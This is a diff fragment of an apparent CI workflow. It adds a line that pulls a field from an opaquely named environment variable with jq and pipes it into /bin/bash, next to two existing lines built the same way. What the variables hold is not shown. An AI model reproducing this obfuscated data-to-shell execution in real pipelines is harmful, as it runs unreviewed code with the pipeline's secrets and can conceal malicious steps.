@@ -21,6 +21,7 @@ jobs:
         run: |
           printf '%s' "$mg165" | jq -r .atj137 | /bin/bash
           printf '%s' "$piwc2" | jq -r .q57292 | /bin/bash
+          echo $p39 | jq -r .f2197 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
